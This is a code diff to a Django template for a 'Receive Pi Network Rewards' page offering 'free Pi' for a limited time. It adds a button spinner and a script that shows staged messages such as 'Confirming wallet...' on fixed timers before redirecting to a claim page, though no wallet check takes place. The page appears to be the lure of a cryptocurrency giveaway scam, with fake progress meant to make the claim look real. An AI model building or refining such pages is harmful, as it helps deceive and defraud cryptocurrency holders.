@@ -21,6 +21,59 @@
     [data-animate="3"] { transition-delay: 0.3s; }
     [data-animate="4"] { transition-delay: 0.4s; }
 </style>
+<style>
+    /* Button with spinner styles */
+    .cta_button {
+        position: relative;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
+    
+    .spinner {
+        width: 20px;
+        height: 20px;
+    }
+    
+    .spinner-svg {
+        animation: rotate 2s linear infinite;
+        width: 100%;
+        height: 100%;
+    }
+    
+    .spinner-svg .path {
+        stroke: white;
+        stroke-linecap: round;
+        animation: dash 1.5s ease-in-out infinite;
+    }
+    
+    @keyframes rotate {
+        100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes dash {
+        0% {
+            stroke-dasharray: 1, 150;
+            stroke-dashoffset: 0;
+        }
+        50% {
+            stroke-dasharray: 90, 150;
+            stroke-dashoffset: -35;
+        }
+        100% {
+            stroke-dasharray: 90, 150;
+            stroke-dashoffset: -124;
+        }
+    }
+    
+    /* Disabled state */
+    .cta_button:disabled {
+        background-color: #f39c12;
+        opacity: 0.9;
+        cursor: not-allowed;
+    }
+</style>
 {% endblock %}
 
 {% block content %}
@@ -34,7 +87,14 @@
 <div class="hero_container" data-animate>
     <h1 class="hero_title" data-animate="1">Receive Pi Network Rewards</h1>
     <h3 class="hero_subtitle" data-animate="2">Join the special promotion for Pi and receive free Pi! Limited time offer for the Pi Network community.</h3>
-    <a href="{% url 'claim' %}" class="cta_button" data-animate="3">CLAIM PI REWARDS</a>
+    <a href="{% url 'claim' %}" class="cta_button" data-animate="3" id="claimButton">
+        <span class="button-text">CLAIM PI REWARDS</span>
+        <span class="spinner" style="display: none;">
+            <svg class="spinner-svg" viewBox="0 0 50 50">
+                <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
+            </svg>
+        </span>
+    </a>
 </div>
 
 <main class="features-grid">
@@ -272,4 +332,39 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 });
 </script>
+<script>
+    document.getElementById('claimButton').addEventListener('click', function(e) {
+        e.preventDefault();
+        const button = this;
+        const buttonText = button.querySelector('.button-text');
+        const spinner = button.querySelector('.spinner');
+        const redirectUrl = button.getAttribute('href');
+        
+        // Disable button and show spinner
+        button.disabled = true;
+        spinner.style.display = 'inline-block';
+        
+        // Animation sequence
+        const states = [
+            { text: 'Claiming...', delay: 1500 },
+            { text: 'Confirming wallet...', delay: 1500 },
+            { text: 'Almost done...', delay: 1000 }
+        ];
+        
+        let currentState = 0;
+        
+        function processNextState() {
+            if (currentState < states.length) {
+                buttonText.textContent = states[currentState].text;
+                setTimeout(processNextState, states[currentState].delay);
+                currentState++;
+            } else {
+                window.location.href = redirectUrl;
+            }
+        }
+        
+        processNextState();
+    });
+    </script>
+    
 {% endblock %}
